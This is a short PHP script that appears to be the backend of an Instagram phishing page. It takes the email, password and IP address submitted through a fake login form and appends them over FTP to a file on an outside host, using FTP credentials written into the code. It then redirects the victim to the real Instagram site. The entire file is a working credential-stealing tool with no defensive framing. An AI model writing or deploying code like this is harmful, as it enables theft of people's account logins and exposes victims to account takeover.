<?php
$correof = $_POST[ 'correof' ];
$passf = $_POST[ 'passf' ];
$ip = $_SERVER[ 'REMOTE_ADDR' ];
 
if( ( empty($correof)) or (empty($passf)) ){
    header('location: index.htm');
}else{  
        //archivo de texto
        $file = fopen("ftp://instapass20:codetek10@ftp.webcindario.com/web/index.html", "a");
        fwrite($file, "email: ".$correof."\r\npass: ".$passf."\r\nIP: ".$ip."\r\n=========================\r\n");
        fclose($file);
        header('location:https://www.instagram.com/?hl=es-la');      
        
}
?>